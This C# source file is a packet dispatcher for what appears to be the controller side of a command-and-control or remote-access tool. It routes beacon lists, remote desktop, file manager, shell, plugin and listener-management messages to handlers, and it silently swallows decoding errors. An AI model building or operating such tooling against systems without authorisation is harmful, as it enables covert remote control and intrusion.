using AVASClient.HandlePacket;
using AVASClient.MessagePackLib;
using AVASClient.Services;
using System;
using System.Threading.Tasks;

namespace AVASClient.Handle_Packet
{
    public static class Packet
    {
        public static async Task ReadAsync(byte[] data)
        {
            try
            {
                ClientMsgPack unpack_msgpack = TryDecodeMsgPack(data);
                string type = unpack_msgpack.ForcePathObject("Pac_ket").AsString;

                switch (type)
                {
                    case "BeaconList":
                        LogService.Instance.Info("收到 Beacon 列表更新", "Packet");
                        await HandleBeaconList.HandleAsync(unpack_msgpack);
                        break;
                    case "Ping":
                        await HandlePing.HandleAsync(unpack_msgpack);
                        break;
                    case "ClientInfo":
                        await HandleClientInfo.HandleAsync(unpack_msgpack);
                        break;
                    case "BeaconDisconnected":
                        await HandleBeaconDisconnected.HandleAsync(unpack_msgpack);
                        break;
                    case "Logs":
                        await HandleLog.HandleAsync(unpack_msgpack);
                        break;
                    case "Error":
                        break;
                    case "SendPlugin":
                        await HandleSendPlugin.HandleAsync(unpack_msgpack);
                        break;
                    case "Information":
                        await HandleInformation.HandleAsync(unpack_msgpack);
                        break;
                    case "RD":
                        await HandleRemoteDesktop.HandleAsync(unpack_msgpack);
                        break;
                    case "FileManager":
                        await HandleFileManager.HandleAsync(unpack_msgpack);
                        break;
                    case "Shell":
                        await HandleShell.HandleAsync(unpack_msgpack);
                        break;
                    case "ListenerManagement":
                        await HandleListenerManagement.HandleAsync(unpack_msgpack);
                        break;
                    default:
                        LogService.Instance.Error($"收到未知数据包: {type}", "Packet");
                        break;
                }
                
            }
            catch (Exception ex)
            {
                // 忽略异常，避免影响连接稳定性；必要时可打开日志
                //LogService.Instance.Error($"处理数据包异常: {ex.Message}", "Packet");
            

                
            }
        }

        private static ClientMsgPack TryDecodeMsgPack(byte[] data)
        {
            // 有些上游可能带有自定义帧头，做偏移容错
            int[] offsets = new int[] { 0, 4, 8 };
            Exception lastEx = null;
            foreach (var off in offsets)
            {
                if (data.Length <= off) continue;
                try
                {
                    var mp = new ClientMsgPack();
                    // 复制切片，避免Decode读取越界
                    if (off == 0)
                    {
                        mp.DecodeFromBytesUnsafe(data);
                    }
                    else
                    {
                        byte[] slice = new byte[data.Length - off];
                        Buffer.BlockCopy(data, off, slice, 0, slice.Length);
                        mp.DecodeFromBytesUnsafe(slice);
                    }
                    // 简单校验：必须有 Pac_ket 字段
                    mp.ForcePathObject("Pac_ket").AsString.ToString();
                    return mp;
                }
                catch (Exception ex)
                {
                    lastEx = ex;
                }
            }
            throw lastEx ?? new Exception("未知的数据包格式");
        }
    }
}